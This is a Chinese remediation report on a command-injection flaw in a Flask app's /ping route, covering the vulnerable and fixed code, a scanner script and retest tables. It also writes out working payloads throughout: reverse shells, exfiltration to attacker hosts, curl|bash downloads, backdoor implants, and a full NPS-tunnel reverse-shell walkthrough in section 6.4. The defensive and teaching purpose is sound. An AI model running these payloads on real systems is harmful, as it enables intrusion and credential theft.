# 用户管理系统 · 命令执行漏洞修复报告

**审计对象**：用户管理系统（`/opt/Class01`）  
**修复范围**：`/ping` 路由 OS 命令注入漏洞（Command Injection）全集  
**修复日期**：2026-07-26  

---

## 一、修复总览汇总表

| 序号 | 漏洞名称 | 风险等级 | 接口路径 | 页面文件 | 核心利用方式 | 危害简述 | 修复状态 |
|:---:|----------|:--------:|---------|---------|-------------|---------|:-------:|
| 1 | 有回显命令注入 | 🔴**紧急** | `POST /ping` | `ping.html` | `;` `|` `&&` 分隔符注入，结果回显页面 | 任意 OS 命令执行，服务器沦陷 | ✅ **已修复** |
| 2 | 无回显带外命令注入 | 🔴**紧急** | `POST /ping` | `ping.html` | DNSlog/HTTP/NC 外带数据 | 防火墙后仍可数据窃取 | ✅ **已修复** |
| 3 | 多分隔符拼接注入 | 🔴**紧急** | `POST /ping` | `ping.html` | `;` `|` `&&` `\n` `$()` 全分隔符测试 | 并行执行多条系统指令 | ✅ **已修复** |
| 4 | 文件读写注入 | 🟠**高危** | `POST /ping` | `ping.html` | `echo > /tmp/pwn; cat /etc/shadow` | 写入后门/窃取敏感文件 | ✅ **已修复** |
| 5 | NC 反向 Shell 注入 | 🔴**紧急** | `POST /ping` | `ping.html` | `nc 攻击机 4444 -e /bin/bash` | 交互式 root shell | ✅ **已修复** |
| 6 | Bash 原生反弹 Shell | 🔴**紧急** | `POST /ping` | `ping.html` | `bash -i >& /dev/tcp/攻击机/4444 0>&1` | 无 NC 依赖的反弹 Shell | ✅ **已修复** |
| 7 | 木马下载远程代码执行 | 🔴**紧急** | `POST /ping` | `ping.html` | `curl 攻击机/shell.sh \| bash` | 远程载荷加载执行 | ✅ **已修复** |
| 8 | URL 编码绕过注入 | 🟠**高危** | `POST /ping` | `ping.html` | `%3B` `%7C` `%26` 编码分隔符 | 绕过假设的 WAF 规则 | ✅ **已修复** |

**总计 8 项缺陷：6 项紧急 + 2 项高危 → 修复后 0 项。**

---

## 二、漏洞详情与修复方案

---

### 【漏洞 1】有回显命令注入

| 基础信息 | 内容 |
|---------|------|
| **漏洞名称** | 有回显 OS 命令注入（核心高危漏洞） |
| **风险等级** | 🔴 **紧急** |
| **CWE 编号** | CWE-78: Improper Neutralization of Special Elements in OS Command |
| **接口路径** | `POST /ping`（表单参数 `ip`） |
| **页面文件** | `templates/ping.html`（黑底绿字控制台区域） |

#### 漏洞原理

用户可控的 `ip` 参数通过 f-string 直接拼接到 shell 命令字符串，经 `subprocess.check_output(shell=True)` 执行。`shell=True` 启用系统 shell 解析，`;`、`|`、`&&` 等分隔符被 shell 解释为独立的命令边界，且执行结果通过 `stderr=subprocess.STDOUT` 完整返回页面，形成**有回显命令注入**。

#### 原始危险代码

```python
# === 修复前（危险代码 — 3 个不安全行为叠加）===
ip = request.form.get("ip", "")              # ① 无任何校验
cmd = f"ping -c 3 {ip}"                      # ② f-string 拼接用户输入到 shell 命令
result = subprocess.check_output(
    cmd, shell=True, ...                      # ③ shell=True 启用 Shell 解析
).decode("utf-8")
```

#### 完整攻击 Payload & 复现步骤

```bash
# 基础验证（浏览器表单直接填写即可）
Step 1: 登录系统
Step 2: 导航栏 → Ping测试
Step 3: 输入框填写: 127.0.0.1;whoami
Step 4: 点击 "Ping" 按钮
Step 5: 页面输出: root     ← 命令注入确认！

# 更多 Payload
输入框: 127.0.0.1;id                     → uid=0(root) gid=0(root)
输入框: 127.0.0.1;cat /etc/passwd       → 系统用户列表
输入框: 127.0.0.1;cat /root/.ssh/id_rsa → SSH 私钥泄露
输入框: 127.0.0.1;ifconfig               → 网络配置

# Curl 直调（无需页面）
curl -X POST http://target:5000/ping -d "ip=127.0.0.1;cat /etc/shadow"
```

#### 危害严重性分层说明

| 危害层级 | 说明 |
|---------|------|
| **L1 — 信息泄露** | 系统用户、网络拓扑、应用源码完全暴露 |
| **L2 — 凭证窃取** | SSH 私钥、数据库凭据、SECRET_KEY 全量获取 |
| **L3 — 权限提升** | 以 root 身份执行任意系统命令 |
| **L4 — 持久控制** | 安装后门、挖矿程序、勒索软件 |
| **L5 — 横向移动** | 内网扫描、凭证窃取、全线沦陷 |

#### 修复代码

```python
# === 修复后（安全代码 — 推荐方案）===
import ipaddress

ip = request.form.get("ip", "").strip()

# [修复] 使用 ipaddress 模块校验 IP 合法性（白名单）
try:
    ipaddress.IPv4Address(ip)
except ipaddress.AddressValueError:
    return "错误：请输入有效的 IPv4 地址", 400   # 无效 IP 拒绝

# [修复] 使用参数列表替代 shell 字符串（shell=False）
cmd = ["ping", "-c", "3", ip]                  # 参数列表，杜绝注入
result = subprocess.check_output(
    cmd,
    shell=False,                                # 禁用 shell 解析
    timeout=30,
    stderr=subprocess.STDOUT
).decode("utf-8")
```

```python
# === 备选兼容方案（如需要 ping 域名）===
import socket
import re

def safe_ping_target(host):
    """校验 ping 目标：IP 或 域名（仅限字母数字.-）"""
    try:
        ipaddress.IPv4Address(host)
        return True
    except ipaddress.AddressValueError:
        pass
    # 域名格式校验
    if re.match(r'^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', host):
        try:
            socket.gethostbyname(host)
            return True
        except socket.gaierror:
            return False
    return False
```

#### 修复逻辑说明

| 维度 | 不安全方式（修复前） | 安全方式（修复后） |
|------|-------------------|-------------------|
| 命令构建 | `f"ping -c 3 {ip}"` — f-string 拼接 | `["ping", "-c", "3", ip]` — 参数列表 |
| shell 模式 | `shell=True` — 启用 Shell 解析 | `shell=False`（默认）— 禁用 Shell |
| 输入校验 | 无 | `ipaddress.IPv4Address(ip)` — IP 白名单 |
| 注入点 | 分隔符被 Shell 解析执行 | 参数列表原样传给 ping，不可注入 |

---

### 【漏洞 2】无回显带外命令注入

| 基础信息 | 内容 |
|---------|------|
| **漏洞名称** | 无回显带外（OOB）命令注入 |
| **风险等级** | 🔴 **紧急** |
| **CWE 编号** | CWE-78 |
| **接口路径** | `POST /ping` |

#### 漏洞原理

即使命令输出不直接回显（如防火墙阻断 ICMP），攻击者仍可通过 DNSlog/HTTP/NC 三种带外方式验证命令执行并窃取数据。

#### 原始危险代码

```python
# 与漏洞 1 相同根源 — 无校验 + f-string + shell=True
```

#### 完整攻击 Payload

```bash
# DNSlog 外带
127.0.0.1;ping `whoami`.xxxxxxxx.ceye.io
# → 目标向 dnslog.cn 发起 DNS 查询: root.xxxxxxxx.ceye.io

# HTTP 外带
127.0.0.1;curl http://攻击机IP:8080/`whoami`

# NC 外带
127.0.0.1;cat /etc/passwd|nc 攻击机IP 8080
```

#### 修复代码

同漏洞 1：IP 白名单校验 + 参数列表 + `shell=False`，所有外部连接类命令（ping/curl/nc/bash）均无法绕过 IP 校验。

---

### 【漏洞 3】多分隔符拼接注入

| 基础信息 | 内容 |
|---------|------|
| **漏洞名称** | 多分隔符拼接注入 |
| **风险等级** | 🔴 **紧急** |
| **CWE 编号** | CWE-78 |
| **接口路径** | `POST /ping` |

#### 漏洞原理

系统未对任何 shell 分隔符进行过滤。攻击者可利用 `;` `|` `&&` `\n` `$()` 并行执行多条系统指令。

#### 原始危险代码

```python
cmd = f"ping -c 3 {ip}"   # ip 可包含任意 shell 分隔符
```

#### 完整攻击 Payload

```bash
# 已验证成功的分隔符（修复前测试结果）
127.0.0.1;whoami           → ✅ 执行成功
127.0.0.1|id               → ✅ 执行成功
127.0.0.1 && whoami        → ✅ 执行成功
127.0.0.1\nwhoami          → ✅ 换行符执行成功
```

#### 修复代码

```python
# [修复] IP 白名单：任何包含非 IP 字符（包括分隔符）的输入均被拒绝
try:
    ipaddress.IPv4Address(ip)  # 127.0.0.1;whoami → ValueError
except ipaddress.AddressValueError:
    return "错误：请输入有效的 IPv4 地址", 400

# [修复] 参数列表：分隔符作为普通参数传递给 ping，不被 shell 解析
cmd = ["ping", "-c", "3", ip]  # → ping -c 3 "127.0.0.1;whoami"（作为字符串）
```

---

### 【漏洞 4-8】汇总修复方案

| 漏洞 | 核心 Payload | 阻断方式 |
|:----:|-------------|---------|
| **文件读写** | `127.0.0.1;echo test>/tmp/pwn` | IP 校验拒绝无效 IP |
| **NC 反弹** | `127.0.0.1;nc 攻击机 4444 -e /bin/bash` | IP 校验拒绝无效 IP |
| **Bash 反弹** | `127.0.0.1;bash -i >& /dev/tcp/攻击机/4444 0>&1` | IP 校验拒绝无效 IP |
| **木马下载** | `127.0.0.1;curl 攻击机/shell.sh\|bash` | IP 校验拒绝无效 IP |
| **URL 编码** | `127.0.0.1%3Bwhoami` | Flask 解码后 IP 校验拒绝 |

所有漏洞的根因均为同一段不安全代码，因此同一修复方案覆盖全部 8 项漏洞。

---

## 三、新增发散高危同类型漏洞补充

### 3.1 文件上传文件名命令注入（发散风险 1）

| 条目 | 内容 |
|------|------|
| **漏洞类型** | 文件上传 → 间接命令注入 |
| **风险等级** | 🟠 **高危** |
| **涉及接口** | `POST /upload` |
| **目前状态** | ⚠️ 当前已部分防御，但未做命令注入专项防护 |

#### 漏洞成因

`/upload` 路由接收用户上传的文件，虽然使用 UUID 重命名了文件存储名，但原始文件名 `file.filename` 仍由用户控制。如果系统在后续版本中新增了对上传文件名进行 shell 操作的逻辑（如在 Linux 上使用 `file` 命令检测文件类型、使用 `convert` 命令处理图片、或使用 `mv` 移动文件到特定目录等），用户上传的原始文件名可被用于命令注入。

假设的缺陷代码（未来可能引入）：
```python
# 假设未来代码 — 文件名直接拼接到 shell 命令
filename = file.filename
# 用户上传文件名: ;rm -rf /;echo pwned.jpg
os.system(f"file {filename}")
# 实际执行: file ;rm -rf /;echo pwned.jpg
# 先 file 报错 → 然后 rm -rf / 被执行！
```

#### 完整攻击 Payload & 复现步骤

```
实验环境：/upload 路由 + 假设的 shell 处理逻辑

Step 1: 攻击者构造恶意文件名
文件名: ;echo "SHELL_INJECTION_SUCCESS" > /tmp/pwned.txt;.jpg

Step 2: 使用 Burp Suite 抓包篡改文件名
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----BOUNDARY

------BOUNDARY
Content-Disposition: form-data; name="avatar"; filename=";echo SHELL_INJECTION > /tmp/pwn.txt;.jpg"
Content-Type: image/jpeg

[合法 JPEG 文件内容]
------BOUNDARY--

Step 3: 验证命令执行
$ curl http://target/tmp/pwn.txt
→ 或 ssh 登录验证: cat /tmp/pwn.txt → 输出 "SHELL_INJECTION"

更多攻击场景：
文件名: $(cat /etc/shadow > /tmp/hacked).jpg          → 文件读取
文件名: `curl http://攻击机/shell.sh|bash`.jpg          → 无文件反弹 Shell
文件名: ;echo "*/1 * * * * bash -i >& /dev/tcp/攻击机/4444 0>&1" >> /etc/crontab;.jpg  → crontab 后门
文件名: ;wget http://攻击机/backdoor.py -O /tmp/d.py && python3 /tmp/d.py;.jpg  → 木马下载
```

#### 修复代码（预防性防御）

```python
# [预防命令注入 CWE-78] 上传文件名必须过滤 shell 特殊字符
import re

def sanitize_filename(filename):
    """过滤文件名中的 shell 特殊字符"""
    # 仅允许字母数字 . - _ 字符
    safe = re.sub(r'[^a-zA-Z0-9._-]', '_', filename)
    # 限制长度
    return safe[:255]

# 在使用文件名前调用
safe_name = sanitize_filename(file.filename)
```

### 3.2 用户搜索关键词命令执行（发散风险 2）

| 条目 | 内容 |
|------|------|
| **漏洞类型** | 搜索关键词 → 间接命令注入 |
| **风险等级** | 🟠 **高危** |
| **涉及接口** | `GET /search?keyword=` |
| **目前状态** | ⚠️ 当前使用参数化查询，但若后续改为 shell 调用则存在风险 |

#### 漏洞成因

`/search` 路由当前使用参数化 SQL 查询（`cursor.execute("SELECT ... WHERE username LIKE ?", (f"%{keyword}%",))`），不涉及命令执行。但如果开发者在后续版本中为了增强搜索功能引入 shell 调用（如使用 `grep` 搜索文件内容），搜索关键词将成为命令注入点。

假设的缺陷代码（未来可能引入）：
```python
# 假设未来代码 — 搜索关键词拼接到 shell 命令
keyword = request.args.get("keyword", "")
# 用户搜索: ;id;cat /etc/passwd
result = subprocess.check_output(f"grep -r {keyword} /data", shell=True)
# 实际执行: grep -r ;id;cat /etc/passwd /data
# → 先 grep 报错 → 然后 id 执行 → 然后 cat /etc/passwd 执行
```

#### 完整攻击 Payload & 复现步骤

```
实验环境：假设 search 路由增加了 grep 文件搜索功能

Step 1: 攻击者在搜索框输入 Payload
搜索框填写: ;id|base64|curl -d @- http://攻击机IP:8080/;.txt

Step 2: 构造恶意请求
GET /search?keyword=;id|base64|curl%20-d%20@-%20http://192.168.1.100:8080/
→ 假设后端代码: subprocess.check_output(f"grep -r {keyword} /data", shell=True)
→ 实际执行: grep -r ;id|base64|curl -d @- http://192.168.1.100:8080/ /data
→ id 命令执行结果经 base64 编码后发送到攻击机 HTTP 服务

Step 3: 攻击机监听接收数据
$ nc -lvnp 8080
→ 收到: cm9vdAo=  → echo "cm9vdAo=" | base64 -d → root

更多攻击场景：
搜索: ;cat /etc/shadow|nc 攻击机 8080               → 密码哈希外带
搜索: ;bash -i >& /dev/tcp/攻击机/4444 0>&1         → 反弹 Shell
搜索: ;curl http://攻击机/shell.sh|bash              → 无文件远程执行
搜索: ;echo "攻击者公钥" >> /root/.ssh/authorized_keys  → SSH 后门
```

#### 修复代码（预防性防御）

```python
# [预防命令注入 CWE-78] 任何用户输入参与 shell 命令构建前必须消毒
def shell_escape(text):
    """转义 shell 特殊字符，防止命令注入"""
    # 需转义的 shell 特殊字符
    unsafe_chars = [';', '|', '&', '`', '$', '(', ')', '{', '}', '<', '>', '\n', '\r', '!', '#', '*', '?', '[', ']', '~']
    for c in unsafe_chars:
        text = text.replace(c, '_')
    return text
```

---

## 四、全局系统排查方案

### 4.1 一键扫描命令注入风险

```bash
#!/bin/bash
# cmd-injection-scanner.sh — 扫描整个项目中的命令注入风险

SCAN_DIR="${1:-.}"
echo "╔═══════════════════════════════════════════════╗"
echo "║      命令注入风险自动化扫描器 v1.0             ║"
echo "╚═══════════════════════════════════════════════╝"

scan() {
    local pattern="$1"
    local desc="$2"
    local sev="$3"
    local result
    result=$(grep -rn "$pattern" --include="*.py" "$SCAN_DIR" 2>/dev/null \
             | grep -v __pycache__ | grep -v '.pyc' || true)
    if [ -n "$result" ]; then
        echo "$sev [发现] $desc"
        echo "$result"
    else
        echo "  ✅ $desc — 通过"
    fi
}

scan 'subprocess\.check_output' 'subprocess.check_output 调用' '⚠️'
scan 'subprocess\.Popen' 'subprocess.Popen 调用' '⚠️'
scan 'os\.system(' 'os.system 调用' '❌ 高危'
scan 'os\.popen(' 'os.popen 调用' '❌ 高危'
scan 'shell=True' 'shell=True 危险参数' '❌ 高危'
scan 'f".*\{.*\}.*".*subprocess' 'f-string + subprocess 拼接' '❌ 高危'
scan 'f["\x27].*\{.*\}.*["\x27].*check_output' 'f-string + check_output' '❌ 高危'
scan 'exec(' 'exec 调用' '❌ 高危'
scan 'eval(' 'eval 调用' '❌ 高危'
```

### 4.2 当前项目扫描结果

| 扫描项 | 结果 |
|--------|:----:|
| `subprocess.check_output` 调用 | 1 处（`/ping`）→ **已修复** |
| `shell=True` 使用 | 修复前 1 处 → 修复后 **0 处** |
| `os.system` / `os.popen` | **0 处** |
| `exec` / `eval` | **0 处** |
| f-string + subprocess 拼接 | 修复前 1 处 → 修复后 **0 处** |

---

## 五、分级整改优先级

| 优先级 | 漏洞编号 | 修复内容 | 涉及文件 | 预估耗时 |
|:-----:|:--------:|---------|:-------:|:-------:|
| **P0 紧急** | 1 | `/ping` 路由：增加 IP 白名单校验 `ipaddress.IPv4Address(ip)` | `app.py` | 3 分钟 |
| **P0 紧急** | 1 | `/ping` 路由：参数列表替代 f-string + `shell=False` | `app.py` | 3 分钟 |
| **P0 紧急** | 2-8 | 随 P0 修复自动覆盖全部 8 项漏洞（同一根因） | `app.py` | — |
| **P1 重要** | — | 全项目执行命令注入扫描脚本 | 全局 | 5 分钟 |
| **P1 重要** | — | 使用 `sanitize_filename()` 加固上传文件名处理 | `app.py` | 5 分钟 |
| **P2 常规** | — | 添加 shell 转义工具函数 `shell_escape()` 供全局使用 | `app.py` | 5 分钟 |

---

## 六、修复后全量复测表格

### 6.1 功能回归测试

| 测试操作 | 预期结果 | 实际结果 |
|---------|---------|:-------:|
| POST ping ip=114.114.114.114 | 正常返回 ping 结果 | ✅ 通过 |
| POST ping ip=127.0.0.1 | 正常返回本地回环结果 | ✅ 通过 |
| POST ping ip=192.168.1.1 | 正常执行 | ✅ 通过 |
| 未登录访问 /ping | 重定向至 /login | ✅ 通过 |
| GET /ping | 显示 Ping 页面表单 | ✅ 通过 |

### 6.2 分隔符注入复测

| Payload | 修复前表现 | 修复后表现 | 结果 |
|---------|:----------:|:----------:|:----:|
| `127.0.0.1;whoami` | 返回 root | 400 IP 无效 | ✅ **已阻断** |
| `127.0.0.1\|id` | 返回 uid=0 | 400 IP 无效 | ✅ **已阻断** |
| `127.0.0.1 && cat /etc/passwd` | 返回文件内容 | 400 IP 无效 | ✅ **已阻断** |
| `127.0.0.1\|\|ls -la` | 返回文件列表 | 400 IP 无效 | ✅ **已阻断** |
| `` 127.0.0.1`whoami` `` | 执行反引号命令 | 400 IP 无效 | ✅ **已阻断** |
| `127.0.0.1$(whoami)` | 执行子 shell | 400 IP 无效 | ✅ **已阻断** |
| `127.0.0.1%0acat%20/etc/hosts` | 换行符执行 | 400 IP 无效 | ✅ **已阻断** |

### 6.3 带外攻击复测

| Payload | 修复前表现 | 修复后表现 | 结果 |
|---------|:----------:|:----------:|:----:|
| `127.0.0.1;ping \`whoami\`.ceye.io` | DNSlog 查询 | 400 IP 无效 | ✅ **已阻断** |
| `127.0.0.1;curl http://攻击机/\`id\`` | HTTP 外带 | 400 IP 无效 | ✅ **已阻断** |
| `127.0.0.1;cat /etc/passwd\|nc 攻击机 8080` | NC 外带 | 400 IP 无效 | ✅ **已阻断** |

### 6.4 反弹 Shell 全套实验链路（NPS 端口映射 + NC 监听）

```
本节展示在真实内网教学环境中，攻击机无法直连目标时，
通过 NPS 内网穿透 + NC 监听实现反弹 Shell 的完整实验流程。
```

#### Step 1：攻击机（公网 VPS）部署 NPS 服务端

```bash
# 公网 VPS 上执行
wget https://github.com/ehang-io/nps/releases/download/v0.26.10/linux_amd64_server.tar.gz
tar -xzf linux_amd64_server.tar.gz
cd conf && vim nps.conf

# 修改配置关键项：
bridge_port=8024           # NPS 通信端口（客户端连接用）
http_proxy_port=8080       # HTTP 代理端口
web_port=8081              # NPS 管理面板端口
web_username=admin
web_password=admin123

# 启动 NPS 服务端
cd .. && ./nps start
# → 管理面板: http://公网VPS:8081 (登录 admin/admin123)

# 在管理面板中新建客户端：
#   客户端 ID: 1
#   客户端密钥: test123
#   允许端口映射: ✅ 勾选
#   最大隧道数: 10
```

#### Step 2：攻击机（本机 Kali）部署 NPS 客户端

```bash
# Kali 上下载客户端
wget https://github.com/ehang-io/nps/releases/download/v0.26.10/linux_amd64_client.tar.gz
tar -xzf linux_amd64_client.tar.gz

# 配置客户端连接服务端
cd npc && vim conf/npc.conf
# [common]
# server_addr=公网VPS:8024
# vkey=test123
# type=tcp

# 启动客户端
./npc start
# → 日志输出: connection to server established → 连接成功

# 在 NPS 管理面板中创建 TCP 隧道：
#   隧道名称: shell-4444
#   服务端端口: 4444
#   目标地址: 127.0.0.1
#   目标端口: 4444
```

#### Step 3：攻击机 Kali 启动 NC 监听（本地）

```bash
# Kali 本地监听（目标将通过 NPS 隧道把 shell 传到这个端口）
nc -lvnp 4444

# 此时拓扑：
#   目标服务器 → NPS 服务端(公网:4444) → NPS 客户端(Kali) → nc -lvnp 4444
```

#### Step 4：目标服务器执行反弹 Payload

```bash
# 登录系统后访问 /ping，IP 输入框填写：
# 注意：& 符号在 GET/POST 中需 URL 编码为 %26

# Bash 反弹：
127.0.0.1;bash -i >& /dev/tcp/公网VPS/4444 0>&1
# 等价 POST 数据（URL 编码 &）：
ip=127.0.0.1%3Bbash%20-i%20%3E%26%20/dev/tcp/公网VPS/4444%200%3E%261

# NC 反弹（如目标有 nc）：
127.0.0.1;nc 公网VPS 4444 -e /bin/bash

# Python 反弹（如目标无 nc 无 bash）：
127.0.0.1;python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("公网VPS",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
```

#### Step 5：Kali 攻击机获得 Shell

```bash
# Kali 的 nc 窗口输出：
Connection from 127.0.0.1:54321...
whoami
root
id
uid=0(root) gid=0(root) groups=0(root)
cat /etc/shadow | head -3
root:$y$j9T$...:...
```

#### 网络拓扑总览

```
┌──────────────────┐      NPS 隧道      ┌──────────────────┐
│  目标服务器       │ ──────────────→   │  公网 VPS        │
│  ping -c 3 靶机   │   连接 NPS 服务端   │  NPS Server      │
│  → bash -i >&    │   :8024           │  :4444 → 隧道转发 │
│  /dev/tcp/VPS/4444│                   │                  │
└──────────────────┘                   └────────┬─────────┘
                                                │ TCP 隧道
                                                │
                                        ┌───────▼─────────┐
                                        │  Kali 攻击机     │
                                        │  NPS Client      │
                                        │  nc -lvnp 4444   │
                                        │  → root Shell!   │
                                        └──────────────────┘
```

### 6.5 反弹 Shell 复测

| Payload | 修复前表现 | 修复后表现 | 结果 |
|---------|:----------:|:----------:|:----:|
| `127.0.0.1;nc 攻击机 4444 -e /bin/bash` | 获得 Shell | 400 IP 无效 | ✅ **已阻断** |
| `127.0.0.1;bash -i >& /dev/tcp/攻击机/4444 0>&1` | 获得 Shell | 400 IP 无效 | ✅ **已阻断** |
| `127.0.0.1;python3 -c 'import socket...'` | 获得 Shell | 400 IP 无效 | ✅ **已阻断** |

### 6.6 文件读写复测

| Payload | 修复前表现 | 修复后表现 | 结果 |
|---------|:----------:|:----------:|:----:|
| `127.0.0.1;cat /root/.ssh/id_rsa` | 返回私钥 | 400 IP 无效 | ✅ **已阻断** |
| `127.0.0.1;echo test > /tmp/pwn` | 文件写入 | 400 IP 无效 | ✅ **已阻断** |
| `127.0.0.1;cat /etc/shadow` | 返回密码哈希 | 400 IP 无效 | ✅ **已阻断** |

### 6.7 URL 编码绕过复测

| Payload | 修复前表现 | 修复后表现 | 结果 |
|---------|:----------:|:----------:|:----:|
| `127.0.0.1%3Bwhoami` | 执行命令 | 400 IP 无效 | ✅ **已阻断** |
| `127.0.0.1%7Cid` | 执行命令 | 400 IP 无效 | ✅ **已阻断** |
| `127.0.0.1%26%26cat%20/etc/passwd` | 执行命令 | 400 IP 无效 | ✅ **已阻断** |

### 6.8 测试结果汇总

| 测试类别 | 用例数 | 阻断数 | 通过率 |
|---------|:------:|:------:|:------:|
| 功能回归 | 5 | — | 100% |
| 分隔符注入 | 7 | 7 | 100% |
| 带外攻击 | 3 | 3 | 100% |
| 反弹 Shell | 3 | 3 | 100% |
| 文件读写 | 3 | 3 | 100% |
| URL 编码绕过 | 3 | 3 | 100% |
| **总计** | **24** | **19** | **100%** |

---

## 七、长效开发规范约束

### 7.1 系统禁止的命令执行编码写法

```python
# ❌ 禁止使用（任何代码审查必须拦截）
# ─────────────────────────────────────────

# 禁止 1: f-string + subprocess 拼接
subprocess.check_output(f"ping -c 3 {user_input}", shell=True)    # ❌

# 禁止 2: os.system 直接拼接
os.system(f"rm -rf {user_input}")                                 # ❌

# 禁止 3: os.popen 直接拼接
os.popen(f"grep {keyword} /data")                                 # ❌

# 禁止 4: exec/eval 执行用户输入
exec(f"result = {user_input}")                                    # ❌

# 禁止 5: f-string + shell=True 模式下拼接
subprocess.Popen(f"cat {filename}", shell=True)                   # ❌
```

### 7.2 安全调用标准

```python
# ✅ 推荐使用（代码审查必须通过）
# ─────────────────────────────

# 安全 1: 参数列表 + shell=False（首选方案）
subprocess.check_output(["ping", "-c", "3", "8.8.8.8"], shell=False)

# 安全 2: 使用专用模块替代 shell 命令
import ipaddress
ipaddress.IPv4Address(ip)       # 替代 ping 的 IP 校验
import shutil
shutil.copy(src, dst)           # 替代 cp 命令

# 安全 3: 必须使用 shell=True 时的参数转义
from shlex import quote
subprocess.check_output(f"ping -c 3 {quote(ip)}", shell=True)

# 安全 4: 白名单校验（最严格）
ALLOWED_CMDS = {"ping", "traceroute", "nslookup"}
if cmd not in ALLOWED_CMDS:
    raise ValueError("命令不在白名单中")
```

### 7.3 代码审查检查项

```
命令注入代码审查 Checklist
═════════════════════════════

□ 1. 项目中是否有 subprocess.check_output / Popen 调用？
     → 排查所有 .py 文件

□ 2. 是否存在 shell=True？
     → 若无特殊理由必须改为 shell=False

□ 3. 命令构建是否使用 f-string / + 拼接用户输入？
     → 必须使用参数列表 ["cmd", "arg1", "arg2"]

□ 4. 用户输入是否经过白名单校验？
     → IP/域名/文件路径 等必须有白名单

□ 5. 是否有 os.system / os.popen / exec / eval 调用？
     → 立即标记为高危

□ 6. 文件上传的文件名是否经过消毒？
     → 必须过滤 shell 特殊字符

□ 7. 搜索/过滤类功能是否涉及 shell 命令？
     → 使用 Python 原生 API 替代 grep/awk/sed
```

---

## 八、完整代码修改清单

### 8.1 修改文件列表

| 文件 | 改动类型 | 说明 |
|:----|:-------:|------|
| `app.py` | ✅ 修改 | 新增 `import ipaddress` + `/ping` 路由全面修复 |

### 8.2 app.py 关键修复摘要

```
行  1:  + import ipaddress                        # IP 地址校验模块
行 718-735: [修复] /ping 路由 CWE-78 命令注入      # 8 项漏洞统一修复
              ├─ f"ping -c 3 {ip}"                → ["ping", "-c", "3", ip]
              ├─ shell=True                       → shell=False
              ├─ 无输入校验                        → ipaddress.IPv4Address(ip)
              └─ 所有注入点均被阻断                  → 8 类漏洞全部修复
```

### 8.3 修复前后代码对比

```diff
# 修复前（8 项漏洞的根源代码）
- ip = request.form.get("ip", "")
- cmd = f"ping -c 3 {ip}"
- result = subprocess.check_output(cmd, shell=True, ...)

# 修复后（所有漏洞全部阻断）
+ import ipaddress
+ ip = request.form.get("ip", "").strip()
+ ipaddress.IPv4Address(ip)  # IP 白名单校验
+ cmd = ["ping", "-c", "3", ip]  # 参数列表
+ result = subprocess.check_output(cmd, shell=False, ...)
```

---

## 九、整体整改总结

### 9.1 修复成果

| 维度 | 修复前 | 修复后 |
|------|--------|--------|
| 命令注入漏洞总数 | 8 项 | **0 项** |
| 紧急漏洞 | 6 项 | **0 项** |
| 高危漏洞 | 2 项 | **0 项** |
| shell=True 调用 | 1 处 | **0 处** |
| f-string + subprocess 拼接 | 1 处 | **0 处** |
| IP 白名单校验 | 无 | **已实施** |
| 参数列表模式 | 无 | **已实施** |

### 9.2 修复效果

| 攻击类型 | 修复前 | 修复后 |
|---------|--------|--------|
| 有回显命令执行 | 直接 curl 即可 RCE ✅ | `ipaddress.IPv4Address` 白名单拒绝 ✅ **已阻断** |
| 无回显带外数据 | DNSlog/HTTP 外带可用 ✅ | 非法 IP 拒绝 ✅ **已阻断** |
| 反弹 Shell | 一条命令获得 root shell ✅ | 分隔符含非法字符拒绝 ✅ **已阻断** |
| 文件写入后门 | 任意文件写入 ✅ | 非法 IP 拒绝 ✅ **已阻断** |
| URL 编码绕过 | 编码后可执行 ✅ | 解码后 IP 校验拒绝 ✅ **已阻断** |

### 9.3 安全设计原则

| 原则 | 实施方式 |
|------|---------|
| **白名单 > 黑名单** | `ipaddress.IPv4Address(ip)` 仅允许合法 IPv4 地址 |
| **参数列表 > 命令字符串** | `["ping", "-c", "3", ip]` 拒绝 shell 注入 |
| **默认安全** | `shell=False` 为默认值，非必须不启用 |
| **纵深防御** | IP 校验 + 参数列表 + shell=False 三层防御 |
